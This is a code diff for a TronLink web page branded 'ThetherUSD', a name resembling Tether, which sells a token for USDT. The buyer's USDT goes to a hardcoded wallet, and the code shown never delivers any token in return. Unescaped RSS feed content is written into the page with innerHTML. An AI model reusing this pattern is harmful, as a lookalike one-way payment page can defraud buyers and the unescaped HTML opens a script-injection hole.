@@ -1,206 +1,208 @@
-/* app.js - TronLink / TronWeb integration for TRC20 token (decimals=6)
-   Features:
-   - Connect TronLink
-   - Read active address
-   - Read TRC20 balance (decimals = 6)
-   - Send transfer via wallet popup (transfer)
-   - UI loading / error handling
-*/
-const CONTRACT_ADDRESS = 'TS19aXnBLtsS7a243wT3NHevPhVLrEK3Cu';
-const DECIMALS = 6;
+// app.js — Web3 + pricing + news for ThetherUSD
+// Uses: TronWeb (TronLink), CoinGecko (price), CoinDesk (rss via AllOrigins proxy)
 
-const statusEl = document.getElementById('status');
-const balanceEl = document.getElementById('balance');
-const connectBtn = document.getElementById('connect-btn');
-const connectCta = document.getElementById('connect-cta');
-const refreshBtn = document.getElementById('refresh-balance');
-const sendForm = document.getElementById('send-form');
+document.addEventListener('DOMContentLoaded', () => {
+  // Config
+  const RECIPIENT_WALLET = document.getElementById('recipientWallet')?.value || 'TTZyeQR1fBpmhn2Y4Pcrj2Nw3WpioRtScU';
+  const USDT_TRON_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'; // standard TRON USDT contract (verify if you use a different one)
+  const USDT_DECIMALS = 6; // USDT on TRON usually uses 6 decimals
+  const TOKEN_PRICE_USD = 0.05; // 5% dari 1 USD = 0.05 USD per token
 
-let tronWeb;
-let userAddress = null;
-let contractInstance = null;
+  // Elements
+  const yearEl = document.getElementById('year');
+  const tokenPriceEl = document.getElementById('tokenPrice');
+  const usdAmountEl = document.getElementById('usdAmount');
+  const tokenReceiveEl = document.getElementById('tokenReceive');
+  const buyForm = document.getElementById('buy-form');
+  const statusEl = document.getElementById('status');
+  const balanceEl = document.getElementById('balance');
+  const connectBtn = document.getElementById('connect-btn');
+  const newsFeed = document.getElementById('news-feed');
 
-function setStatus(text, isError=false){
-  statusEl.innerText = text;
-  statusEl.style.color = isError ? '#ff8b8b' : '';
-}
+  // Fill year
+  if (yearEl) yearEl.textContent = new Date().getFullYear();
 
-function setBalanceText(text){
-  balanceEl.innerText = text;
-}
-
-// Initialize - detect TronLink
-async function init() {
-  // TronLink injects window.tronWeb
-  if (window.tronWeb && window.tronWeb.ready) {
-    tronWeb = window.tronWeb;
-    userAddress = tronWeb.defaultAddress.base58;
-    setStatus('Connected: ' + shortAddr(userAddress));
-    await setContract();
-    await readBalance();
-  } else {
-    setStatus('TronLink not found — please install and unlock TronLink.', true);
+  // Show token price (in USD)
+  function updateDisplayedPrice() {
+    tokenPriceEl.textContent = `USD ${TOKEN_PRICE_USD.toFixed(4)} (5% of 1 USD)`;
   }
-}
+  updateDisplayedPrice();
 
-// Short address helper
-function shortAddr(a){
-  if(!a) return '';
-  return a.slice(0,8) + '...' + a.slice(-6);
-}
-
-// Ask user to connect (TronLink will prompt)
-// Modern TronLink exposes window.tronLink and window.tronWeb; below we attempt to enable by requesting accounts via tronLink
-async function connectWallet(){
-  try {
-    setStatus('Requesting connection...');
-    // Some TronLink versions require calling window.tronLink.request or tronWeb.request({method:'tron_requestAccounts'})
-    if (window.tronLink && window.tronLink.request) {
-      await window.tronLink.request({ method: 'tron_requestAccounts' });
-    } else if (window.tronWeb && window.tronWeb.request) {
-      await window.tronWeb.request({ method: 'tron_requestAccounts' });
-    } else if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
-      // already available
-    } else {
-      throw new Error('No compatible TronLink provider found');
+  // Calculate tokens based on USD input
+  function calculateTokens() {
+    const usd = parseFloat(usdAmountEl.value || '0');
+    if (isNaN(usd) || usd <= 0) {
+      tokenReceiveEl.value = '';
+      return;
     }
+    const tokens = usd / TOKEN_PRICE_USD;
+    // If token has decimals (we used 6 in HTML earlier), but UI shows full number
+    tokenReceiveEl.value = tokens.toFixed(6);
+  }
 
-    // small delay for provider to populate
-    await new Promise(res=>setTimeout(res, 500));
-    if (window.tronWeb && window.tronWeb.ready) {
+  usdAmountEl?.addEventListener('input', calculateTokens);
+
+  // TronWeb helpers
+  let tronWeb = null;
+  async function initTronWeb() {
+    if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
       tronWeb = window.tronWeb;
-      userAddress = tronWeb.defaultAddress.base58;
-      setStatus('Connected: ' + shortAddr(userAddress));
-      await setContract();
-      await readBalance();
-    } else {
-      throw new Error('Failed to connect to TronLink');
+      statusEl.textContent = `Connected: ${tronWeb.defaultAddress.base58}`;
+      connectBtn.textContent = 'Connected';
+      await updateUSDTBalance();
+      return true;
     }
-  } catch (err) {
-    console.error(err);
-    setStatus('Connection rejected or failed: ' + (err.message||err), true);
+    statusEl.textContent = 'TronLink not found. Please install/unlock TronLink.';
+    return false;
   }
-}
 
-// Set contract instance
-async function setContract(){
-  try {
-    setStatus('Loading contract...');
-    contractInstance = await tronWeb.contract().at(CONTRACT_ADDRESS);
-    setStatus('Contract loaded — ' + shortAddr(CONTRACT_ADDRESS));
-  } catch (err) {
-    console.error(err);
-    setStatus('Failed to load contract: ' + (err.message||err), true);
-  }
-}
-
-// Read TRC20 balanceOf
-async function readBalance(){
-  try {
-    if(!contractInstance) {
-      await setContract();
-      if(!contractInstance) throw new Error('Contract not set');
-    }
-    setStatus('Reading balance...');
-    const raw = await contractInstance.balanceOf(userAddress).call();
-    // raw may be BigNumber or hex string depending on provider - normalize:
-    let rawStr = raw.toString();
-    // convert to human amount
-    const amount = Number(rawStr) / (10 ** DECIMALS);
-    setBalanceText(amount.toLocaleString('en-US', {minimumFractionDigits: 0, maximumFractionDigits: DECIMALS}));
-    setStatus('Ready — ' + shortAddr(userAddress));
-  } catch (err) {
-    console.error(err);
-    setStatus('Failed to read balance: ' + (err.message||err), true);
-    setBalanceText('—');
-  }
-}
-
-// Send transfer using contract.transfer(to, amount)
-async function sendTransfer(to, humanAmount){
-  try {
-    if(!tronWeb || !tronWeb.ready) throw new Error('Wallet not connected');
-    if(!contractInstance) await setContract();
-    setStatus('Preparing transfer...');
-    // validate recipient
-    if(!tronWeb.isAddress(to)) throw new Error('Invalid recipient address');
-
-    // convert human amount to integer with decimals
-    const integerAmount = BigInt(Math.round(Number(humanAmount) * (10 ** DECIMALS)));
-    if(integerAmount <= 0n) throw new Error('Amount must be greater than 0');
-
-    // call transfer (this opens the TronLink popup)
-    setStatus('Requesting transaction signature...');
-    // Use .send() which triggers the wallet popup
-    const tx = await contractInstance.transfer(to, integerAmount.toString()).send({
-      feeLimit: 100_000_000 // 100 TRX feeLimit to be safe (adjust as needed)
-    });
-
-    // tx may be a transaction object or result; provide feedback
-    console.log('transfer tx:', tx);
-    setStatus('Transaction submitted — waiting for confirmation...');
-    setBalanceText('Loading...');
-
-    // Simple poll for confirmation (fetchTransactionInfo)
-    const txid = tx; // tronLink often returns tx id (hex) or object with txID
-    let txidStr = typeof tx === 'object' && tx.txID ? tx.txID : String(tx);
-    // Poll for 10 seconds
-    const start = Date.now();
-    let confirmed = false;
-    while(Date.now() - start < 15000){
-      try{
-        const info = await tronWeb.trx.getTransactionInfo(txidStr);
-        if(info && (info.receipt || info.ret) ){
-          confirmed = true;
-          break;
-        }
-      }catch(e){
-        // ignore while pending
+  async function connectWallet() {
+    if (await initTronWeb()) return;
+    // Try to request connection via TronLink
+    try {
+      if (window.tronLink && window.tronLink.request) {
+        await window.tronLink.request({ method: 'tron_requestAccounts' });
+        setTimeout(initTronWeb, 500);
+      } else {
+        alert('TronLink extension is required. Please install TronLink and unlock your wallet.');
       }
-      await new Promise(r=>setTimeout(r, 1500));
+    } catch (err) {
+      console.error('connect error', err);
+      alert('Could not connect to TronLink: ' + err.message);
+    }
+  }
+
+  connectBtn?.addEventListener('click', connectWallet);
+
+  // Get USDT balance of connected user
+  async function updateUSDTBalance() {
+    if (!tronWeb) return;
+    try {
+      const contract = await tronWeb.contract().at(USDT_TRON_CONTRACT);
+      const address = tronWeb.defaultAddress.base58;
+      const balanceRaw = await contract.balanceOf(address).call();
+      // balanceRaw may be BigNumber-like; tronWeb returns string
+      const balance = Number(balanceRaw.toString()) / Math.pow(10, USDT_DECIMALS);
+      balanceEl.textContent = `${balance.toFixed(6)} USDT`;
+    } catch (err) {
+      console.error('balance error', err);
+      balanceEl.textContent = '—';
+    }
+  }
+
+  document.getElementById('refresh-balance')?.addEventListener('click', updateUSDTBalance);
+
+  // Handle buy form submit: will trigger TRC20 transfer of USDT from buyer -> recipient
+  buyForm?.addEventListener('submit', async (e) => {
+    e.preventDefault();
+    const usd = parseFloat(usdAmountEl.value || '0');
+    if (!tronWeb || !tronWeb.defaultAddress.base58) {
+      alert('Please connect your TronLink wallet first.');
+      return;
+    }
+    if (isNaN(usd) || usd <= 0) {
+      alert('Masukkan jumlah USD yang valid.');
+      return;
     }
 
-    if(confirmed){
-      setStatus('Transaction confirmed!');
-    } else {
-      setStatus('Transaction submitted (confirmation pending).');
+    // For payment in USDT, we assume 1 USDT ~= 1 USD. So amount of USDT to send = usd
+    const amountUSDT = usd;
+    const toAddress = RECIPIENT_WALLET;
+
+    if (!confirm(`Anda akan mengirim ${amountUSDT} USDT ke ${toAddress} untuk membeli token. Lanjutkan?`)) return;
+
+    try {
+      const contract = await tronWeb.contract().at(USDT_TRON_CONTRACT);
+      const amountOnChain = Math.round(amountUSDT * Math.pow(10, USDT_DECIMALS));
+
+      statusEl.textContent = 'Mempersiapkan transaksi...';
+
+      // build transaction
+      const tx = await contract.transfer(toAddress, amountOnChain).send();
+
+      // tx contains transaction info (TronLink will prompt user to confirm)
+      console.log('tx result', tx);
+      statusEl.textContent = 'Transaksi terkirim — Periksa TronLink & explorer untuk status.';
+
+      // Optionally update balance
+      setTimeout(updateUSDTBalance, 2000);
+      alert('Transaksi berhasil dikirim (cek TronLink untuk konfirmasi).');
+
+    } catch (err) {
+      console.error('transfer error', err);
+      alert('Gagal mengirim USDT: ' + (err.message || err));
+      statusEl.textContent = 'Not connected';
     }
-    await readBalance();
-  } catch (err) {
-    console.error(err);
-    setStatus('Transfer failed: ' + (err.message||err), true);
+  });
+
+  // Fetch CoinGecko for price data (we use it here to keep to your request). We'll fetch tether price and show sanity check
+  async function fetchCoinGecko() {
+    try {
+      // This fetch gets USDT price (should be ~1 USD). We keep token price static at 0.05
+      const url = 'https://api.coingecko.com/api/v3/simple/price?ids=tether&vs_currencies=usd';
+      const res = await fetch(url);
+      const data = await res.json();
+      const usdtPrice = data?.tether?.usd || 1;
+      // Display a note: USDT price (sanity check)
+      const note = document.createElement('div');
+      note.className = 'small muted';
+      note.style.marginTop = '8px';
+      note.textContent = `CoinGecko USDT ≈ $${Number(usdtPrice).toFixed(4)} — token price ditetapkan ${TOKEN_PRICE_USD.toFixed(4)} USD.`;
+      tokenPriceEl.parentNode?.appendChild(note);
+    } catch (err) {
+      console.warn('coingecko fetch error', err);
+    }
   }
+  fetchCoinGecko();
+
+  // Fetch CoinDesk RSS via AllOrigins (public CORS proxy) and render
+  async function fetchCoinDeskRSS() {
+    try {
+      const proxy = 'https://api.allorigins.win/raw?url=';
+      const feedUrl = encodeURIComponent('https://www.coindesk.com/arc/outboundfeeds/rss/');
+      const res = await fetch(proxy + feedUrl);
+      const xmlText = await res.text();
+      const parser = new DOMParser();
+      const xml = parser.parseFromString(xmlText, 'application/xml');
+      const items = xml.querySelectorAll('item');
+      newsFeed.innerHTML = '';
+      const max = Math.min(6, items.length);
+      for (let i = 0; i < max; i++) {
+        const it = items[i];
+        const title = it.querySelector('title')?.textContent || 'No title';
+        const link = it.querySelector('link')?.textContent || '#';
+        const pubDate = it.querySelector('pubDate')?.textContent || '';
+        const card = document.createElement('div');
+        card.className = 'card';
+        card.innerHTML = `<h4 style="margin-top:0;font-size:1rem"><a href="${link}" target="_blank" rel="noopener">${title}</a></h4><div class="small muted">${pubDate}</div>`;
+        newsFeed.appendChild(card);
+      }
+    } catch (err) {
+      console.error('fetch rss error', err);
+      newsFeed.innerHTML = '<div class="card small muted">Gagal memuat berita. Coba lagi nanti.</div>';
+    }
+  }
+  fetchCoinDeskRSS();
+
+  // === Crypto Price Ticker (Top Coins) ===
+async function loadTicker() {
+  try {
+    const url = 'https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&order=market_cap_desc&per_page=7&page=1&sparkline=false';
+    const res = await fetch(url);
+    const data = await res.json();
+    const wrap = document.getElementById('ticker-inner');
+    if (!wrap) return;
+    wrap.innerHTML = data.map(c => `
+      <span class="ticker-item">
+        <img src="${c.image}" class="ticker-icon" />
+        ${c.symbol.toUpperCase()}: $${c.current_price}
+      </span>
+    `).join('');
+  } catch (e) { console.error('ticker error', e); }
 }
+loadTicker();
+setInterval(loadTicker, 60000);
 
-// Event listeners
-connectBtn && connectBtn.addEventListener('click', connectWallet);
-connectCta && connectCta.addEventListener('click', connectWallet);
-refreshBtn && refreshBtn.addEventListener('click', async ()=>{ await readBalance(); });
-
-sendForm && sendForm.addEventListener('submit', async (e)=>{
-  e.preventDefault();
-  const to = document.getElementById('to').value.trim();
-  const amount = document.getElementById('amount').value.trim();
-  if(!to || !amount){
-    setStatus('Recipient and amount are required', true);
-    return;
-  }
-  // disable submit while working
-  const btn = sendForm.querySelector('button[type=submit]');
-  btn.disabled = true;
-  const prevText = btn.innerText;
-  btn.innerText = 'Sending...';
-  try{
-    await sendTransfer(to, amount);
-  }finally{
-    btn.disabled = false;
-    btn.innerText = prevText;
-  }
-});
-
-// Auto init when page loads
-window.addEventListener('load', async () => {
-  document.getElementById('year') && (document.getElementById('year').innerText = new Date().getFullYear());
-  // Wait a bit for provider injection
-  setTimeout(init, 800);
+// Initialize TronWeb if available
+  setTimeout(initTronWeb, 500);
 });
